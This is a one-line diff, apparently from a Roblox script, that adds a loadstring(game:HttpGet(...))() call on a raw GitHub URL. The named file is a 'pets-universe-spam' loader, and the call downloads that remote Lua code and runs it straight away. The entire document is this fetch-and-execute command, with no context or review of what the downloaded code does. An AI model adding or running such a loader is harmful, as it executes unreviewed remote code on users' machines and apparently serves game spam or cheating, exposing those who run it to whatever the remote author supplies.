@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/pets-universe-spam6-qep5vav5jpkh0e.lua"))()
